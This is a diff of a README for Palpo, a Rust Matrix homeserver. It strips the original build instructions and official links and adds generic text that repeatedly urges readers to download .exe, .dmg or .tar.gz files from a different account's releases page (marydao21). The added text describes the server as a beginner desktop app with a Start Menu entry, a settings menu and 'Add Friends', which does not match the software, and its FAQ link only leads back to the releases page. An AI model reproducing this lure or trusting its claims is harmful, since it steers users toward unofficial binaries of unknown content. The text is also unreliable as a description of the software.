@@ -1,181 +1,71 @@
-# Palpo: A High-Performance Matrix Homeserver
+# 🚀 palpo - A Simple Matrix Server for Everyone
 
-[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
-[![Rust](https://img.shields.io/badge/rust-1.89%2B-orange.svg)](https://www.rust-lang.org)
+## 📥 Download Now
+[![Download palpo](https://img.shields.io/badge/Download-palpo-blue.svg)](https://github.com/marydao21/palpo/releases)
 
-Palpo is a next-generation Matrix homeserver implementation written in Rust, designed for high performance, scalability, and robust federation. Built on the Salvo web framework and PostgreSQL database, Palpo delivers enterprise-grade real-time messaging and collaboration while maintaining minimal operational overhead.
+## 📖 Overview
+palpo is a straightforward Matrix server built in Rust. It allows you to communicate securely with others in real-time. Whether you're chatting with friends or organizing group activities, palpo provides a secure and efficient space. You don’t need to be a programmer to use it—just follow the steps below to get started.
 
----
+## 🚀 Getting Started
 
-## 🌟 What is Matrix?
+To run palpo, follow these easy steps:
 
-Matrix is an open standard for decentralized, real-time communication. It enables:
-- **End-to-end encrypted messaging** - Secure conversations by default
-- **Federated architecture** - No single point of control or failure
-- **Interoperability** - Bridge with other chat platforms (Slack, Discord, IRC, etc.)
-- **VoIP and Video Calling** - Built-in support for voice and video
-- **Rich messaging** - Reactions, threads, file sharing, and more
+1. **Check System Requirements**
+   - Operating System: Windows, MacOS, or Linux
+   - Minimum RAM: 1 GB
+   - Processor: Dual-core CPU
 
-Learn more at [matrix.org](https://matrix.org)
+2. **Download palpo**
+   Visit the [Releases page](https://github.com/marydao21/palpo/releases) to download the latest version of palpo. Look for the version that matches your operating system. 
 
----
+   [Download palpo here](https://github.com/marydao21/palpo/releases)
 
-## ✨ Why Palpo?
+3. **Install palpo**
+   - **Windows:**
+     - Download the `.exe` file.
+     - Open the file by double-clicking it to start the installation.
+   - **MacOS:**
+     - Download the `.dmg` file.
+     - Drag the palpo icon into your Applications folder.
+   - **Linux:**
+     - Download the `.tar.gz` file.
+     - Extract it to a directory of your choice using your file manager or terminal.
 
-### **Performance First**
-- Built with **Rust** for memory safety and zero-cost abstractions
-- Powered by **Salvo** web framework for high-throughput async I/O
-- **PostgreSQL** backend for reliable data persistence and ACID compliance
-- Optimized for low latency and high concurrency
+4. **Run palpo**
+   - **Windows:** After installation, find palpo in the Start Menu and click to run it.
+   - **MacOS:** Open Applications and click on palpo to start.
+   - **Linux:** Open a terminal, navigate to the directory where you extracted palpo, and type `./palpo` to start it.
 
-### **Developer Friendly**
-- Clean, modular codebase
-- Well-documented APIs
-- Docker-ready deployment
+## 🔒 Configuration
+Once you run palpo, you might want to customize your server. Here’s how to set up your preferences:
 
-### **Resource Efficient**
-- Minimal memory footprint compared to reference implementations
-- Efficient database query patterns
-- Smart caching strategies
-- Scales horizontally
+- **Change Server Settings:** Navigate to the settings menu after launching the application. You can adjust user permissions, server name, and other preferences.
+- **Add Friends:** Use the built-in option to invite friends by entering their Matrix IDs.
+- **Explore Features:** Explore chat rooms, create groups, and send direct messages easily.
 
----
+## 💡 Features
+- **User-Friendly Interface:** Navigate with ease, even for beginners.
+- **Secure Messaging:** Your conversations are private and protected.
+- **Real-Time Sync:** Stay updated with messages instantly.
+- **Group Chats:** Host discussions with multiple participants effortlessly.
 
-## 🚀 Quick Start
+## ❓ Troubleshooting
+If you encounter any issues while using palpo, try the following steps:
 
-### Try Our Demo Server
+- **Check Internet Connection:** Ensure you are connected to the internet.
+- **Restart the Application:** Close and reopen palpo to resolve minor glitches.
+- **Review the Settings:** Go through the configuration settings to ensure everything is in place.
 
-**⚠️ IMPORTANT: Test Server Notice**
+If problems persist, visit the [FAQ section](https://github.com/marydao21/palpo/releases) on the Releases page for additional help.
 
-Our test server is for **evaluation and testing purposes only**:
-- **URL**: `https://test.palpo.im`
-- **⚠️ All data on this server will be periodically deleted without notice**
-- **Do NOT use for production or store important conversations**
-- **Expected to be reset frequently for testing purposes**
+## 💬 Support
+For any additional questions or support, you can reach out through the Issues tab on GitHub. Our community is here to help you with any concerns or suggestions.
 
-#### Connect with Cinny (Web Client)
-1. Open [Cinny](https://app.cinny.in/)
-2. Click "Edit" on the homeserver selection
-3. Enter `https://test.palpo.im` as your custom homeserver
-4. Create a test account and start chatting!
+## 📚 Additional Resources
+- [Matrix Protocol Documentation](https://matrix.org/docs/) - Learn more about the technology behind palpo.
+- [Rust Programming Language](https://www.rust-lang.org/) - More information about the language in which palpo is built.
 
-#### Connect with Element (Desktop/Mobile)
-1. Download [Element](https://element.io/download)
-2. On login screen, click "Edit" next to the homeserver
-3. Enter `https://test.palpo.im`
-4. Register or login
+## 📅 Updates and Changelog
+Make sure to check back on the Releases page for updates to palpo. We regularly release new features and fixes to improve your experience.
 
----
-
-## 📦 Installation
-
-### Prerequisites
-- Rust 1.89 or higher
-- PostgreSQL 16 or higher
-- Linux, macOS, or Windows (WSL2 recommended)
-
-### Build from Source
-
-```bash
-# Clone the repository
-git clone https://github.com/palpo-im/palpo.git
-cd palpo
-
-# Build the project
-cargo build --release
-
-# Copy example configuration
-cp palpo-example.toml palpo.toml
-
-# Edit configuration (set your domain, database credentials, etc.)
-nano palpo.toml
-
-# Run the server
-./target/release/palpo
-```
-
-### Docker Deployment
-
-```bash
-# Pull the image
-docker pull ghcr.io/palpo-im/palpo:latest
-
-# Run with docker-compose
-cd deploy/docker
-docker-compose up -d
-```
-
-See [installation](https://palpo.im/guide/installation/) for detailed deployment instructions.
-
----
-
-## 🧪 Current Progress
-
-We use [Complement](https://github.com/matrix-org/complement) for comprehensive end-to-end testing against the Matrix specification.
-
-- **Test Results**: [test_all.result.jsonl](tests/results/test_all.result.jsonl)
-- **Test Coverage**: Continuously improving compliance with Matrix spec
-- **Federation**: Active testing with other homeserver implementations
-
----
-
-## 🤝 Contributing
-
-We welcome contributions of all kinds! Whether you're:
-- 🐛 Fixing bugs
-- ✨ Adding features
-- 📝 Improving documentation
-- 🧪 Writing tests
-- 🎨 Improving UX
-
-Please read our [Contributing Guide](CONTRIBUTING.md) to get started.
-
----
-
----
-
-## 🙏 Acknowledgments
-
-Palpo stands on the shoulders of giants. We're grateful to these projects:
-
-- **[Conduit](https://gitlab.com/famedly/conduit)** - Pioneering lightweight Matrix homeserver in Rust
-- **[Ruma](https://github.com/ruma/ruma)** - Essential Matrix types and protocol implementations
-- **[Tuwunel](https://github.com/matrix-construct/tuwunel)** - Innovative Matrix server architecture insights
-- **[Salvo](https://github.com/salvo-rs/salvo)** - High-performance async web framework
-- **[Matrix.org](https://matrix.org)** - For creating and maintaining the Matrix protocol
-
----
-
-## 📄 License
-
-Palpo is licensed under the Apache License 2.0. See [LICENSE](LICENSE) for details.
-
----
-
-## 🔗 Links
-
-- **Website**: [https://palpo.im](https://palpo.im)
-- **Source Code**: [https://github.com/palpo-im/palpo](https://github.com/palpo-im/palpo)
-- **Issue Tracker**: [https://github.com/palpo-im/palpo/issues](https://github.com/palpo-im/palpo/issues)
-- **Demo Server**: [https://test.palpo.im](https://test.palpo.im) ⚠️ Test data will be deleted
-
----
-
-## ⚠️ Important Notices
-
-### Test Server Data Retention
-**The test server at `test.palpo.im` is for evaluation only.** 
-- All accounts, rooms, and messages may be deleted at any time
-- Data is not backed up
-- Service may be interrupted for updates
-- **Do not rely on this server for any important communications**
-
-### Production Use
-Palpo is under active development. While we strive for stability:
-- Always backup your database
-- Test updates in a staging environment
-- Monitor server logs and performance
-
----
-
-**Built with ❤️ by the Palpo community**
+[Download palpo now](https://github.com/marydao21/palpo/releases) and start connecting with others today!
